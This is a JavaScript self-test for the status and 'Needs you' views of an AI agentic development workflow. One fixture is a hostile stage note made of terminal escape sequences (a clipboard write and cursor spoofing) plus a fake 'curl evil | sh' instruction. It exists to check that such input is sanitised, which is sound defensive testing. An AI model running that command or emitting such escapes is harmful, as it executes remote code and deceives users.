#!/usr/bin/env node
'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  PHASES,
  needsYou,
  deriveRoleGroupStatus,
  effectiveStatus,
  consistencyIssues,
  currentWork,
  percentComplete,
  buildSummary,
  renderTerminal,
  renderMarkdown,
} = require('./progress');

function staleApprovedState() {
  return {
    status: 'active',
    phases: {
      request: { status: 'pass' },
      requirements: { status: 'pass' },
      'acceptance-criteria': { status: 'pass' },
      'definition-of-done': { status: 'pass' },
      inspection: { status: 'pass' },
      analysis: { status: 'in_progress' },
      plan: { status: 'in_progress' },
      approval: { status: 'pass' },
    },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pass', executor: 'claude' },
        'qa-plan': { status: 'pass', executor: 'claude' },
      },
    },
  };
}

{
  const state = staleApprovedState();
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'plan'), 'pass');
  assert.strictEqual(currentWork(state), 'Waiting for Implementation');
  assert.ok(consistencyIssues(state).length >= 2);
  assert.strictEqual(percentComplete(state), Math.round((8 / PHASES.length) * 100), 'eight finished stages');
}

{
  const state = {
    status: 'active',
    phases: { analysis: { status: 'in_progress' } },
    selectedRoles: { analysis: ['architect', 'security'] },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pending', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(currentWork(state), 'Specialist Analysis');
  // Parallel roles: every running role is named, not just the first.
  state.roles.analysis.architect.status = 'in_progress';
  state.roles.analysis.security.status = 'in_progress';
  assert.strictEqual(currentWork(state), 'Specialist Analysis → architect, security');
  // A sibling that already failed does not turn a running stage red: the
  // stage stays in_progress, and the running role is still named.
  state.roles.analysis.architect.status = 'fail';
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(currentWork(state), 'Specialist Analysis → security');
  // Once nothing runs any more, the failure shows.
  state.roles.analysis.security.status = 'pass';
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'fail');
  state.roles.analysis.architect.status = 'blocked';
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'blocked');
}

{
  const state = {
    status: 'active',
    phases: { analysis: { status: 'in_progress' } },
    selectedRoles: { analysis: ['architect', 'security'] },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pass', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'pass');
  assert.strictEqual(currentWork(state), 'Waiting for Request');
}

{
  const state = {
    status: 'active',
    phases: {
      analysis: { status: 'in_progress' },
      plan: { status: 'in_progress' },
    },
    roles: {
      analysis: {
        security: { status: 'in_progress', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(currentWork(state), 'Implementation Plan');
  assert.ok(consistencyIssues(state).some(message => message.includes('Multiple stored phases')));
}

// The pull-request stage comes after final verification.
{
  const verified = () => ({ status: 'active', phases: Object.fromEntries(PHASES.filter(p => p !== 'pull-request').map(p => [p, { status: 'pass' }])), roles: {} });
  assert.strictEqual(PHASES[PHASES.length - 1], 'pull-request');
  const waiting = verified();
  assert.strictEqual(currentWork(waiting), 'Waiting for Pull Request');
  assert.strictEqual(percentComplete(waiting), Math.round(((PHASES.length - 1) / PHASES.length) * 100));
  assert.strictEqual(buildSummary('FEAT-1', waiting).pullRequestHint, null, 'no hint while the stage is still to run');

  // Skipped (opt-in disabled): complete, with the command that opens it.
  const previous = process.env.AI_AGENTIC_CLI;
  process.env.AI_AGENTIC_CLI = '1';
  const skipped = verified();
  skipped.phases['pull-request'] = { status: 'skipped', note: 'pull_request.enabled is not true' };
  assert.strictEqual(percentComplete(skipped), 100);
  assert.strictEqual(currentWork(skipped), 'Done');
  const skippedSummary = buildSummary('FEAT-1', skipped);
  assert.strictEqual(skippedSummary.pullRequestHint, 'agentic pr FEAT-1');
  assert.match(renderTerminal(skippedSummary), /Pull request: not opened — run: agentic pr FEAT-1/);
  assert.match(renderMarkdown(skippedSummary), /\*\*Pull request:\*\* not opened — run `agentic pr FEAT-1`/);
  if (previous === undefined) delete process.env.AI_AGENTIC_CLI; else process.env.AI_AGENTIC_CLI = previous;

  // Blocked: named as the current stop.
  const blocked = verified();
  blocked.phases['pull-request'] = { status: 'blocked', note: 'missing credentials' };
  assert.strictEqual(currentWork(blocked), 'Pull Request (blocked)');

  // Opened: the number and URL near the top, whitelisted fields only.
  const opened = verified();
  opened.phases['pull-request'] = { status: 'pass' };
  opened.pullRequest = { provider: 'bitbucket', number: 7762, url: 'https://bitbucket.org/ws/app/pull-requests/7762', status: 'open', branch: 'ai/FEAT-1', base: 'master', draft: false, commit: 'abc', preCommitSha: 'def', reason: 'internal' };
  const summary = buildSummary('FEAT-1', opened);
  assert.deepStrictEqual(Object.keys(summary.pullRequest).sort(), ['base', 'branch', 'draft', 'number', 'provider', 'status', 'url']);
  const terminal = renderTerminal(summary).split('\n');
  const prRow = terminal.findIndex(line => line.includes('Pull request: #7762 https://bitbucket.org/ws/app/pull-requests/7762'));
  assert.ok(prRow > 0 && prRow < terminal.findIndex(line => line.includes('Request ')), 'the PR line sits above the stage list');
  assert.match(renderMarkdown(summary), /\*\*Pull request:\*\* \[#7762\]\(https:\/\/bitbucket\.org\/ws\/app\/pull-requests\/7762\)/);

  // A run closed before the stage existed is finished, not stuck at 93%.
  const closed = verified();
  closed.status = 'done';
  assert.strictEqual(effectiveStatus(closed, 'pull-request'), 'skipped');
  assert.strictEqual(percentComplete(closed), 100);
  // It shows no "agentic pr" hint (its PR may have been opened by hand), and no
  // "(stored: pending)" next to a status the view derived itself.
  const closedSummary = buildSummary('FEAT-OLD', closed);
  assert.strictEqual(closedSummary.pullRequestHint, null, 'no hint for a run closed before the stage existed');
  assert.strictEqual(closedSummary.phases.find(p => p.id === 'pull-request').rawStatus, undefined);
  assert.ok(!/stored: pending/.test(renderTerminal(closedSummary)), renderTerminal(closedSummary));
  assert.ok(!/Pull request: not opened/.test(renderTerminal(closedSummary)));

  // An abandoned run never reached the stage: it is not counted as done.
  const abandoned = { status: 'done', abandoned: true, roles: {}, phases: Object.fromEntries(PHASES.slice(0, 6).map(p => [p, { status: 'pass' }])) };
  const before = { ...abandoned, status: 'active', abandoned: undefined };
  assert.strictEqual(effectiveStatus(abandoned, 'pull-request'), 'pending');
  assert.strictEqual(percentComplete(abandoned), Math.round((6 / (PHASES.length - 1)) * 100), 'the stage it never reached is left out of the percent');
  assert.ok(percentComplete(abandoned) < 100 && percentComplete(abandoned) >= percentComplete(before));
  assert.strictEqual(buildSummary('FEAT-GAVEUP', abandoned).pullRequestHint, null);
  // A closed run that has the stage gets the hint with --reopen.
  const closedSkipped = verified();
  closedSkipped.status = 'done';
  closedSkipped.phases['pull-request'] = { status: 'skipped', note: 'pull_request.enabled is not true' };
  assert.match(buildSummary('FEAT-2', closedSkipped).pullRequestHint, / pr FEAT-2 --reopen$/);
}

// Needs you: what the run waits on a human for, with the reason and the command.
{
  const passed = upTo => Object.fromEntries(PHASES.slice(0, PHASES.indexOf(upTo)).map(p => [p, { status: 'pass' }]));
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-needs-'));
  try {
    assert.strictEqual(needsYou('FEAT-1', { status: 'active', phases: passed('analysis'), roles: {} }, { root }), null, 'nothing waits on a human mid-run');
    assert.strictEqual(needsYou('FEAT-1', { status: 'done', phases: { 'build-test': { status: 'fail', note: 'x' } } }, { root }), null, 'a closed run needs nobody');

    // A failed stage: its reason, and the retry command as this install spells it.
    const failed = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: '2026-11-04T10:00:00.000Z', note: 'build-test/qa-execute: 3 widget tests fail in test/login_test.dart' } } };
    const attention = needsYou('FEAT-1', failed, { root, cli: true });
    assert.deepStrictEqual(
      [attention.kind, attention.stage, attention.headline, attention.reason, attention.command, attention.repeated, attention.key],
      ['fail', 'build-test', 'Build + Tests failed', 'build-test/qa-execute: 3 widget tests fail in test/login_test.dart', 'agentic retry FEAT-1', 0, 'FEAT-1|build-test|fail|2026-11-04T10:00:00.000Z']);
    assert.strictEqual(needsYou('FEAT-1', failed, { root, cli: false }).command, 'node ai/tasks/feature/runs.js retry FEAT-1 && node ai/workflow/engine.js resume FEAT-1');
    // The same failure again: the stage cannot fix it.
    failed.phases['build-test'].repeatedFailure = 3;
    const repeated = needsYou('FEAT-1', failed, { root, cli: true });
    assert.strictEqual(repeated.headline, 'Same failure as last time — this needs a fix outside Build + Tests');
    assert.strictEqual(repeated.repeated, 3);
    const summary = buildSummary('FEAT-1', failed, { root });
    assert.deepStrictEqual(summary.needsYou, needsYou('FEAT-1', failed, { root }));
    const terminal = renderTerminal(summary);
    assert.match(terminal, /⚠ Needs you: Same failure as last time — this needs a fix outside Build \+ Tests\n {3}build-test\/qa-execute: 3 widget tests fail in test\/login_test\.dart\n(?: {3}· .*\n)* {3}→ run: /);
    assert.match(terminal, / {3}· Leave a note the retry will read \(evidence, a decision\): edit \S*notes\/build-test\.md\n/, 'a stopped stage offers a note for the retry');
    assert.ok(terminal.indexOf('Needs you') < terminal.indexOf('Request '), 'the banner sits above the stage list');
    const markdown = renderMarkdown(summary);
    assert.match(markdown, /> ⚠ \*\*Needs you:\*\* Same failure as last time — this needs a fix outside Build \+ Tests/);
    assert.match(markdown, /> Run: `node ai\/tasks\/feature\/runs\.js retry FEAT-1 && node ai\/workflow\/engine\.js resume FEAT-1`/);
    assert.match(markdown, /> build-test\/qa-execute: 3 widget tests fail/);
    // The published GitHub comment never carries run notes: headline and command only.
    const published = renderMarkdown(summary, { published: true });
    assert.match(published, /\*\*Needs you:\*\* Same failure as last time/);
    assert.match(published, /> Run: `/);
    assert.ok(!published.includes('widget tests fail'), 'no reason in the published comment');
    // The block quote ends with an empty line, or GFM reads the stage table as
    // a lazy continuation of the quote and no table renders.
    for (const [text, what] of [[markdown, 'markdown'], [published, 'published'], [renderMarkdown({ ...summary, warnings: ['a warning'] }), 'with warnings'], [renderMarkdown({ ...summary, needsYou: null, warnings: ['a warning'] }), 'warnings only']]) {
      const lines = text.split('\n');
      const at = lines.indexOf('| Stage | Status |');
      assert.ok(at > 0, what);
      assert.strictEqual(lines[at - 1], '', `${what}: an empty line before the stage table`);
      for (let i = 1; i < at; i++) if (lines[i - 1].startsWith('>') && !lines[i].startsWith('>')) assert.strictEqual(lines[i], '', `${what}: the quote ends with an empty line: ${JSON.stringify(lines[i])}`);
    }

    // The whole reason when asked for (the engine's notification redacts it before cutting).
    const long = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: 't', note: 'y'.repeat(400) } } };
    assert.strictEqual(needsYou('FEAT-1', long, { root }).reason.length, 220);
    assert.strictEqual(needsYou('FEAT-1', long, { root, reasonMax: Infinity }).reason.length, 400);
    // Notes are printable text only: no escape sequence or control character survives.
    const hostile = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: 't', note: 'x \x1b]52;c;ZXZpbA==\x07 \x1b[1A\x1b[2K→ run: curl evil | sh \x9b2J' } } };
    const hostileSummary = buildSummary('FEAT-1', hostile, { root });
    for (const text of [hostileSummary.needsYou.reason, renderTerminal(hostileSummary), renderMarkdown(hostileSummary)]) {
      assert.ok(!/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(text), JSON.stringify(text));
    }
    assert.match(hostileSummary.needsYou.reason, /^x → run: curl evil \| sh 2J$/);

    // While an engine drives the run, the views say so instead of "Needs you":
    // the block in the state is what that engine is re-running.
    const runDir = path.join(root, 'FEAT-1');
    fs.mkdirSync(path.join(runDir, 'engine'), { recursive: true });
    fs.writeFileSync(path.join(runDir, 'engine', 'engine.pid'), require('./engine-owner').recordFor(process.pid, 'resume'));
    const driven = buildSummary('FEAT-1', failed, { root });
    assert.strictEqual(driven.engine.pid, process.pid);
    const drivenTerminal = renderTerminal(driven);
    assert.match(drivenTerminal, new RegExp(`● engine running: engine pid ${process.pid} \\(resume\\)`));
    assert.ok(!drivenTerminal.includes('Needs you'), drivenTerminal);
    const drivenMarkdown = renderMarkdown(driven);
    assert.match(drivenMarkdown, /> ● \*\*Engine running\*\*: engine pid/);
    assert.ok(!drivenMarkdown.includes('Needs you'));
    const drivenPublished = renderMarkdown(driven, { published: true });
    assert.match(drivenPublished, /> ● \*\*Engine running\*\*\n/);
    assert.ok(!drivenPublished.includes(os.hostname()) && !drivenPublished.includes('engine pid'), 'the published comment names no host or process');
    assert.strictEqual(drivenMarkdown.split('\n')[drivenMarkdown.split('\n').indexOf('| Stage | Status |') - 1], '');
    fs.unlinkSync(path.join(runDir, 'engine', 'engine.pid'));
    assert.strictEqual(buildSummary('FEAT-1', failed, { root }).engine, null);
    assert.strictEqual(buildSummary('FEAT-1', failed, { root, demo: true }).engine, null, 'the demo never looks');

    // A parallel stage: the failed roles and their notes.
    const reviews = { status: 'active', phases: { ...passed('reviews'), reviews: { status: 'in_progress' } }, selectedRoles: { reviews: ['code-review', 'security-review'] }, roles: { reviews: { 'code-review': { status: 'pass' }, 'security-review': { status: 'fail', note: 'review reports unresolved findings', updatedAt: 't1', repeatedFailure: 2 } } } };
    const review = needsYou('FEAT-2', reviews, { root, cli: true });
    assert.deepStrictEqual([review.stage, review.reason, review.repeated, review.key], ['reviews', 'security-review: review reports unresolved findings', 2, 'FEAT-2|reviews|fail|t1']);

    // A blocked conditional role: its stage still reads pending.
    const conditional = { status: 'active', roles: {}, phases: passed('verification'), conditionals: { verification: { 'mobile-evidence': { status: 'blocked', reason: 'no booted Android emulator', updatedAt: 't2' } } } };
    const evidence = needsYou('FEAT-3', conditional, { root, cli: true });
    assert.deepStrictEqual([evidence.kind, evidence.stage, evidence.role, evidence.headline, evidence.reason, evidence.command], ['blocked', 'verification', 'mobile-evidence', 'Final Verification (mobile-evidence) blocked', 'mobile-evidence: no booted Android emulator', 'agentic retry FEAT-3']);
    conditional.phases.verification = { status: 'pass' };
    assert.notStrictEqual(needsYou('FEAT-3', conditional, { root })?.stage, 'verification', 'a stage that passed since is not waiting on its old conditional');

    // Verified with no pull request recorded (a run verified before the stage
    // existed, or one whose PR was opened by hand): it says how to open or record it.
    const pending = needsYou('FEAT-3', conditional, { root, cli: true });
    assert.deepStrictEqual([pending.kind, pending.stage, pending.headline, pending.command], ['waiting', 'pull-request', 'Verified — no pull request recorded yet', 'agentic pr FEAT-3']);
    assert.strictEqual(needsYou('FEAT-3', { ...conditional, pullRequest: { url: 'https://example.test/pr/1' } }, { root }), null, 'a recorded pull request is not asked for again');
    assert.strictEqual(needsYou('FEAT-3', { ...conditional, status: 'done' }, { root }), null, 'a closed run asks for nothing');

    // A blocked pull request resumes; the furthest stop wins.
    const pr = { status: 'active', roles: {}, phases: { ...passed('pull-request'), 'pull-request': { status: 'blocked', note: 'BITBUCKET_API_TOKEN is not set' }, requirements: { status: 'fail', note: 'stale' } } };
    assert.deepStrictEqual([needsYou('FEAT-4', pr, { root, cli: true }).stage, needsYou('FEAT-4', pr, { root, cli: true }).command], ['pull-request', 'agentic resume FEAT-4']);

    // Human gates: approval (never a key, always the command) and conflicts.
    const gate = { status: 'active', roles: {}, phases: { ...passed('approval'), plan: { status: 'pass', updatedAt: 'p1' } } };
    fs.mkdirSync(path.join(root, 'FEAT-5'), { recursive: true });
    const approval = needsYou('FEAT-5', gate, { root, cli: true });
    assert.deepStrictEqual([approval.kind, approval.stage, approval.headline, approval.command, approval.key], ['waiting', 'approval', 'The plan waits for your approval', 'agentic approve FEAT-5', 'FEAT-5|approval|waiting|p1']);
    fs.writeFileSync(path.join(root, 'FEAT-5', 'plan.approved'), 'approved\n');
    assert.strictEqual(needsYou('FEAT-5', gate, { root }), null, 'approved: nothing waits');
    const conflicts = { status: 'active', roles: {}, phases: passed('plan') };
    fs.mkdirSync(path.join(root, 'FEAT-6', '05-analysis'), { recursive: true });
    fs.writeFileSync(path.join(root, 'FEAT-6', '05-analysis', 'conflicts.json'), JSON.stringify({ conflicts: [{ id: 'CONFLICT-002', status: 'unresolved' }, { id: 'CONFLICT-001', status: 'unresolved' }, { id: 'CONFLICT-003', status: 'resolved' }] }));
    const disputed = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.deepStrictEqual([disputed.kind, disputed.stage, disputed.headline, disputed.command, disputed.key], ['waiting', 'plan', 'Specialist conflicts block the plan', 'agentic conflicts FEAT-6', 'FEAT-6|plan|waiting|CONFLICT-001,CONFLICT-002']);
    assert.match(disputed.reason, /^2 unresolved conflict\(s\): CONFLICT-001, CONFLICT-002\. Decide each with agentic resolve/);
    // An architecture selection gate.
    const arch = { status: 'active', roles: {}, phases: { 'architecture-options': { status: 'pass', updatedAt: 'a1' } } };
    assert.deepStrictEqual([needsYou('FEAT-7', arch, { root, cli: true }).stage, needsYou('FEAT-7', arch, { root, cli: true }).command], ['architecture-selection', 'agentic architecture FEAT-7 <option-id>']);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

// A stage stopped by a rejected agent report: the report says why, and the
// options start with what fits it.
{
  const { whyLines, needsYouLines } = require('./progress');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-why-'));
  try {
    const id = 'WHY-1';
    fs.mkdirSync(path.join(root, id, 'engine'), { recursive: true });
    const report = { status: 'fail', summary: 'All tests pass, but pub get rewrote pubspec.lock.', tests: { passed: 80, failed: 0, skipped: 0 },
      commands: [{ command: 'flutter test', status: 'pass' }, { command: 'git checkout -- pubspec.lock', status: 'blocked', note: 'role may not run mutating shell commands' }, { command: 'flutter analyze', status: 'fail', note: '1 new info lint' }],
      acceptanceCoverage: { 'AC-1': 'pass', 'AC-18': 'fail: analyzer gate not met' },
      sideEffects: [{ file: 'pubspec.lock', change: '28-line re-resolve' }, { file: 'analysis_options.yaml', change: '+3 excludes' }], notRun: ['Sonar'] };
    fs.writeFileSync(path.join(root, id, 'engine', 'build-test-qa-execute.rejected'), JSON.stringify(report));
    const state = { status: 'active', roles: {}, phases: { ...Object.fromEntries(['request', 'requirements', 'acceptance-criteria', 'definition-of-done', 'inspection', 'analysis', 'plan', 'approval', 'implementation'].map(p => [p, { status: 'pass' }])), 'build-test': { status: 'fail', updatedAt: 't1', note: 'build-test/qa-execute: artifact rejected — ag' } } };
    const attention = needsYou(id, state, { root, cli: true });
    assert.strictEqual(attention.details.role, 'qa-execute');
    assert.strictEqual(attention.details.tests, '80 passed, 0 failed, 0 skipped');
    assert.deepStrictEqual(attention.details.failed.map(f => f.split(' — ')[0]), ['git checkout -- pubspec.lock', 'flutter analyze']);
    assert.deepStrictEqual(attention.details.acceptance, ['AC-18: fail: analyzer gate not met']);
    assert.deepStrictEqual(attention.options.map(o => o.label), ['Revert what its tools changed (if still changed)', 'Read the full report', 'Leave a note the retry will read (evidence, a decision)', 'Retry the stage']);
    assert.match(attention.options[0].command, /checkout -- pubspec\.lock analysis_options\.yaml$/);
    assert.strictEqual(attention.options.at(-1).command, 'agentic retry WHY-1', 'retry stays last');
    const terminal = needsYouLines(attention).join('\n');
    assert.match(terminal, /All tests pass, but pub get rewrote pubspec\.lock\./, 'the agent\'s own summary replaces the cut-down note');
    assert.match(terminal, /✗ flutter analyze — fail: 1 new info lint/);
    const why = whyLines(id, state, { root, cli: true }).join('\n');
    for (const part of ['What the agent said:', 'Tests: 80 passed', 'Acceptance criteria not met:', '! pubspec.lock — 28-line re-resolve', 'Not run:', 'What you can do:']) assert.ok(why.includes(part), `why shows ${part}`);
    assert.ok(!/agentic why WHY-1/.test(why), 'why does not offer itself');
    // Restored by the runtime: no revert to offer.
    fs.writeFileSync(path.join(root, id, 'engine', 'build-test-qa-execute.restored.json'), JSON.stringify({ restored: [{ path: 'pubspec.lock', from: 'HEAD' }, { path: 'analysis_options.yaml', from: 'HEAD' }] }));
    const after = needsYou(id, state, { root, cli: true });
    assert.ok(!after.options.some(o => /Revert/.test(o.label)), 'nothing left to revert');
    assert.match(needsYouLines(after).join('\n'), /pubspec\.lock \(restored by the runtime\)/);
    // A failure with no report keeps the old shape.
    fs.rmSync(path.join(root, id, 'engine'), { recursive: true, force: true });
    const plain = needsYou(id, state, { root, cli: true });
    assert.strictEqual(plain.details, null);
    assert.deepStrictEqual(plain.options.map(o => o.label), ['Leave a note the retry will read (evidence, a decision)', 'Retry the stage']);
    assert.match(whyLines('NONE', { status: 'done', phases: {} }, { root }).join(''), /nothing is waiting on you\. The run is closed\./);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

// Role descriptions and live activity: terminal views only.
{
  const { withActivity, renderMarkdown } = require('./progress');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-activity-'));
  try {
    const state = { status: 'active', startedAt: new Date().toISOString(), phases: { implementation: { status: 'in_progress', updatedAt: new Date(Date.now() - 90000).toISOString() }, analysis: { status: 'in_progress' } }, selectedRoles: { analysis: ['security', 'docs'] }, roles: { analysis: { security: { status: 'in_progress', executor: 'claude', updatedAt: new Date().toISOString() }, docs: { status: 'pass', executor: 'claude' } } } };
    const run = path.join(root, 'ACT-1');
    fs.mkdirSync(path.join(run, 'engine'), { recursive: true });
    fs.writeFileSync(path.join(run, 'engine', 'analysis-security.activity.jsonl'), `${JSON.stringify({ t: new Date().toISOString(), kind: 'tool', text: 'Read lib/auth/session.dart' })}\n`);
    const summary = withActivity(buildSummary('ACT-1', state, { root }), run);
    const analysis = summary.phases.find(p => p.id === 'analysis');
    assert.match(analysis.roles.find(r => r.role === 'security').description, /^Threat-model auth/);
    assert.strictEqual(analysis.roles.find(r => r.role === 'security').activity.text, 'Read lib/auth/session.dart');
    assert.strictEqual(analysis.roles.find(r => r.role === 'docs').activity, undefined, 'finished roles carry no activity');
    const impl = summary.phases.find(p => p.id === 'implementation');
    assert.strictEqual(impl.role, 'implementation');
    assert.strictEqual(impl.activity, null, 'a running stage with no file yet has no activity');
    const text = renderTerminal(summary);
    assert.match(text, /Threat-model auth/, 'the running role says what it does');
    assert.match(text, /↳ Read lib\/auth\/session\.dart · \d+s ago/, 'and what it is doing now');
    assert.match(text, /↳ working · 1m3\ds/, 'a stage with no activity yet shows how long it has run');
    assert.doesNotMatch(renderMarkdown(buildSummary('ACT-1', state, { root }), { published: true }), /session\.dart/, 'the published view never carries activity');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

console.log('progress-selftest OK');
